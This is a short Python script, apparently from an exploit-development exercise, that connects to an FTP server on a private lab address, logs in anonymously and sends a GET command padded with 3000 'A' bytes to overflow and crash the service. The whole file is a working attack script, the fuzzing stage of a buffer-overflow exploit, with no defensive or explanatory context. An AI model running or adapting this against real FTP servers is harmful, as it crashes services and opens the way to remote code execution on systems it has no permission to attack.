#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis


import socket
import sys

payload = b"A"* 3000

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connect = s.connect(('192.168.122.49',21))

s.recv(1024)
s.send(b'USER anonymous\r\n')

s.recv(1024)
s.send(b'PASS anonymous\r\n')

s.recv(1024)
s.send(b'GET' + payload + b'\r\n')

s.close()
